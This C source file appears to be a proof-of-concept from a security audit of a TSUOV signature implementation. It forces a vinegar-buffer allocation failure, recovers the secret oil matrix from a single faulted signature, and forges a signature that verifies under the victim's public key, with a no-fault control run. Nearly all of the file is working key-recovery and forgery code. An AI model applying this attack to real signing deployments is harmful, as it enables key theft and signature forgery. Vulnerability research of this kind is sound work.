/* sign-31-8: a failed vinegar expansion in TSUOV signing leaves public data in
 * the vinegar buffer, and one such signature gives the secret oil matrix.
 *
 * Expand_V (tsuov_core.c:628-636) fills the stack buffer r3 through
 * RejSampPRG_sm3, which ignores pseudoXOF's status (tsuov_core.c:409-411). If
 * pseudoXOF's allocation fails, RejSamp decodes whatever r3's stack slot holds.
 * In these builds that is Expand_sk's zeroed r2 followed by the public Pi1
 * expansion (index m1-1, from seed_pk) left by the previous sign or verify
 * call, so the vinegars are computable from the public key. The attacker tries
 * the stack offset of that expansion and keeps the one whose overdetermined
 * system is consistent. TSUOV_Sign still outputs a valid signature and
 * sig_sign returns 0.
 *
 * Linked with -Wl,--wrap=malloc -Wl,--wrap=pseudoXOF. The pseudoXOF wrapper
 * (a) when armed, makes pseudoXOF's own first malloc fail for the
 * vinegar-sized request, and (b) in the attacker's forging step only, returns
 * bytes that decode to the RECOVERED oil matrix in place of Expand_sk's
 * expansion of a dummy seed, so the attacker can run the unmodified
 * TSUOV_Sign with it.
 *
 * Steps: keygen; sign m1 and verify it (no fault); sign m2 with the vinegar
 * allocation failing. The attacker, from pk and (m2, sig2) only, predicts the
 * vinegars, solves the oil matrix and signs a fresh m3, which sig_verify
 * checks under the victim's public key. Control: the same with sig2 produced
 * without the fault. Exit 0 iff the faulted run forges and the control does
 * not. With argument "start", prints a line before the faulted signing call
 * (used to show that TSUOV-512 never returns from it). */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "SIG_AlgorithmInstance.h"
#include "tsuov_core.h"
#include "drng.h"

int sig_keygen(unsigned char *, unsigned long long *, unsigned char *, unsigned long long *);
int sig_sign(unsigned char *, unsigned long long, unsigned char *, unsigned long long,
             unsigned char *, unsigned long long *);
int sig_verify(unsigned char *, unsigned long long, unsigned char *, unsigned long long,
               unsigned char *, unsigned long long);
MGF_CTX_s *PRG_copy_sm3(MGF_CTX_s *src);
void RejSampPRG_sm3(MGF_CTX_s *ctx, const uint64_t index, const unsigned int length,
                    const unsigned int tau, uint8_t *dst);

DRNG_ctx drng_algorithm;

void *__real_malloc(size_t);
int __real_pseudoXOF(unsigned long long, const unsigned char *, unsigned long long, unsigned char *);

static int fail_next, arm_vinegar, inject, announce;
static uint8_t inj_bytes[TSUOV_Pi2_RS_LEN];
static TSUOV_SEED dummy_seed;

void *__wrap_malloc(size_t n)
{
    if (fail_next) { fail_next = 0; return NULL; }
    return __real_malloc(n);
}

int __wrap_pseudoXOF(unsigned long long outbits, const unsigned char *msg,
                     unsigned long long inbits, unsigned char *out)
{
    if (arm_vinegar && outbits == (unsigned long long)TSUOV_kv_RS_LEN * 8) {
        arm_vinegar = 0;
        fail_next = 1;                    /* pseudoXOF's own first malloc fails */
    }
    if (inject && outbits == (unsigned long long)TSUOV_Pi2_RS_LEN * 8 &&
        inbits == (unsigned long long)(TSUOV_SEED_LEN + 2) * 8 &&
        memcmp(msg, dummy_seed, TSUOV_SEED_LEN) == 0) {
        memcpy(out, inj_bytes, TSUOV_Pi2_RS_LEN);
        return 0;
    }
    return __real_pseudoXOF(outbits, msg, inbits, out);
}

/* F_31[z]/(z^2 - 3), as in MATRIX_VxO_dot_VECTOR_O_whipk */
typedef struct { int a, b; } F;
static int md(int x) { x %= 31; return x < 0 ? x + 31 : x; }
static F fsub(F x, F y) { F r = { md(x.a - y.a), md(x.b - y.b) }; return r; }
static F fmul(F x, F y) { F r = { md(x.a * y.a + 3 * x.b * y.b), md(x.a * y.b + x.b * y.a) }; return r; }
static int iz(F x) { return x.a == 0 && x.b == 0; }
static F finv(F x)
{
    int n = md(x.a * x.a - 3 * x.b * x.b), ni = 1;
    for (int e = 0; e < 29; e++) ni = md(ni * n);
    F r = { md(x.a * ni), md(-x.b * ni) };
    return r;
}

/* RejSamp as specified: 5-bit LSB-first values, 31 rejected, 0 if exhausted */
static void rejsamp(const uint8_t *in, unsigned tau, uint8_t *out, unsigned len)
{
    uint32_t buf = 0; unsigned cnt = 0, p = 0;
    for (unsigned i = 0; i < len; i++) {
        for (;;) {
            while (cnt < 5 && p < tau) { buf |= (uint32_t)in[p++] << cnt; cnt += 8; }
            if (cnt < 5) { out[i] = 0; break; }
            uint8_t v = buf & 31; buf >>= 5; cnt -= 5;
            if (v != 31) { out[i] = v; break; }
        }
    }
}

static uint8_t vin[TSUOV_k][TSUOV_L][TSUOV_V];
static uint8_t r1[TSUOV_Pi1_LEN];

/* public Pi1 expansion for index m1-1, as the signer and verifier compute it */
static void expand_last_pi1(const TSUOV_SEED seed_pk)
{
    MGF_CTX_s *c0 = PRG_init_sm3(seed_pk), *c1 = PRG_copy_sm3(c0);
    RejSampPRG_sm3(c1, 2 * (TSUOV_m1 - 1), TSUOV_Pi1_LEN, TSUOV_Pi1_RS_LEN, r1);
    PRG_final_sm3(c1); PRG_final_sm3(c0);
}

/* candidate stale vinegar buffer: Expand_sk's zeroed r2, then the public Pi1
 * expansion at a stack-layout offset d (tried by the attacker) */
static int predict_vinegars(int d)
{
    static uint8_t stale[TSUOV_kv_RS_LEN], v[TSUOV_kv_LEN];
    for (int i = 0; i < TSUOV_kv_RS_LEN; i++) {
        int q = i + d;
        if (i < TSUOV_Pi2_LEN) stale[i] = 0;
        else if (q >= 0 && q < TSUOV_Pi1_LEN) stale[i] = r1[q];
        else return 0;
    }
    rejsamp(stale, TSUOV_kv_RS_LEN, v, TSUOV_kv_LEN);
    const uint8_t *s = v;                                   /* ExpandMatrixkxV order */
    for (int i = 0; i < TSUOV_k; i++)
        for (int j = 0; j < TSUOV_V; j++)
            for (int l = 0; l < TSUOV_L; l++) vin[i][l][j] = *s++;
    return 1;
}

/* s_k = v_k - SdT * x_k  =>  sum_i x_k[i] * SdT[i][j] = v_k[j] - s_k[j] */
static int recover(const TSUOV_SIGNATURE_s *sg, F O[TSUOV_O][TSUOV_V])
{
    for (int j = 0; j < TSUOV_V; j++) {
        F A[TSUOV_k][TSUOV_O + 1];
        for (int k = 0; k < TSUOV_k; k++) {
            for (int i = 0; i < TSUOV_O; i++) {
                F x = { sg->s[k][0][TSUOV_V + i], sg->s[k][1][TSUOV_V + i] };
                A[k][i] = x;
            }
            F vv = { vin[k][0][j], vin[k][1][j] }, ss = { sg->s[k][0][j], sg->s[k][1][j] };
            A[k][TSUOV_O] = fsub(vv, ss);
        }
        int r = 0;
        for (int c = 0; c < TSUOV_O; c++) {
            int p = -1;
            for (int q = r; q < TSUOV_k; q++) if (!iz(A[q][c])) { p = q; break; }
            if (p < 0) return 0;
            for (int t = 0; t <= TSUOV_O; t++) { F x = A[r][t]; A[r][t] = A[p][t]; A[p][t] = x; }
            F iv = finv(A[r][c]);
            for (int t = 0; t <= TSUOV_O; t++) A[r][t] = fmul(A[r][t], iv);
            for (int q = 0; q < TSUOV_k; q++) if (q != r && !iz(A[q][c])) {
                F f = A[q][c];
                for (int t = 0; t <= TSUOV_O; t++) A[q][t] = fsub(A[q][t], fmul(f, A[r][t]));
            }
            r++;
        }
        for (int q = r; q < TSUOV_k; q++) if (!iz(A[q][TSUOV_O])) return 0;
        for (int i = 0; i < TSUOV_O; i++) O[i][j] = A[i][TSUOV_O];
    }
    return 1;
}

static void pack_injection(F O[TSUOV_O][TSUOV_V])     /* Expand_sk order (i, j, l) */
{
    memset(inj_bytes, 0, sizeof inj_bytes);
    size_t bit = 0;
    for (int i = 0; i < TSUOV_O; i++)
        for (int j = 0; j < TSUOV_V; j++)
            for (int l = 0; l < TSUOV_L; l++) {
                unsigned v = (unsigned)(l ? O[i][j].b : O[i][j].a);
                for (int b = 0; b < 5; b++, bit++)
                    if (v >> b & 1) inj_bytes[bit >> 3] |= (uint8_t)(1u << (bit & 7));
            }
}

static int run(int fault, int *rc2, int *v2, int *rec, int *forged, int *offset)
{
    static unsigned char pk[CRYPTO_PUBLICKEYBYTES], sk[CRYPTO_SECRETKEYBYTES];
    static unsigned char sn1[CRYPTO_BYTES], sn2[CRYPTO_BYTES], sn3[CRYPTO_BYTES];
    unsigned long long pkl, skl, l1, l2;
    unsigned char m1[32], m2[32], m3[32], seed[48];
    for (int i = 0; i < 48; i++) seed[i] = (uint8_t)(7 * i + 1);
    for (int i = 0; i < 32; i++) { m1[i] = (uint8_t)i; m2[i] = (uint8_t)(i ^ 0x5c); m3[i] = (uint8_t)(i ^ 0xa7); }
    init_random_number(&drng_algorithm, seed, 48);

    if (sig_keygen(pk, &pkl, sk, &skl)) return -1;
    if (sig_sign(sk, skl, m1, 32, sn1, &l1) || sig_verify(pk, pkl, sn1, l1, m1, 32)) return -1;
    if (fault && announce) { puts("faulted signing started"); fflush(stdout); }
    arm_vinegar = fault;
    *rc2 = sig_sign(sk, skl, m2, 32, sn2, &l2);
    arm_vinegar = 0;
    *v2 = sig_verify(pk, pkl, sn2, l2, m2, 32);

    /* ---- attacker: pk and (m2, sn2) only ---- */
    static TSUOV_SIGNATURE_s s2, s3;
    static F O[TSUOV_O][TSUOV_V];
    TSUOV_SEED seed_pk, sv, sr, ss;
    size_t pb = 0;
    restore_TSUOV_SEED(pk, &pb, seed_pk);
    pb = 0; restore_TSUOV_SIGNATURE(sn2, &pb, &s2);
    expand_last_pi1(seed_pk);
    *rec = 0;
    for (int d = -TSUOV_Pi1_LEN; d < TSUOV_Pi1_LEN && !*rec; d++)
        if (predict_vinegars(d) && recover(&s2, O)) { *rec = 1; *offset = d; }
    *forged = 0;
    if (*rec) {
        memset(dummy_seed, 0xEE, sizeof dummy_seed);
        for (int i = 0; i < TSUOV_SEED_LEN; i++) { sv[i] = (uint8_t)(i + 1); sr[i] = (uint8_t)(i + 2); ss[i] = (uint8_t)(i + 3); }
        pack_injection(O);
        inject = 1;
        TSUOV_Sign(dummy_seed, seed_pk, sv, sr, ss, m3, 32, &s3);
        inject = 0;
        memset(sn3, 0, sizeof sn3);
        pb = 0; store_TSUOV_SIGNATURE(&s3, sn3, &pb);
        *forged = sig_verify(pk, pkl, sn3, CRYPTO_BYTES, m3, 32) == 0;
    }
    return 0;
}

int main(int argc, char **argv)
{
    announce = argc > 1 && !strcmp(argv[1], "start");
    int rc2, v2, rec, forged, off = 0;
    if (run(1, &rc2, &v2, &rec, &forged, &off)) { puts("setup failed"); return 1; }
    printf("sign(m2, vinegar allocation fails)=%d verify(m2)=%d oil-matrix-solved=%d (layout offset %d) forgery(m3)-verifies=%d; ",
           rc2, v2, rec, off, forged);
    int ok = rc2 == 0 && rec == 1 && forged == 1;
    if (run(0, &rc2, &v2, &rec, &forged, &off)) { puts("setup failed"); return 1; }
    printf("control sign(m2)=%d verify(m2)=%d oil-matrix-solved=%d forgery(m3)-verifies=%d\n",
           rc2, v2, rec, forged);
    ok = ok && rc2 == 0 && v2 == 0 && rec == 0 && forged == 0;
    return ok ? 0 : 3;
}
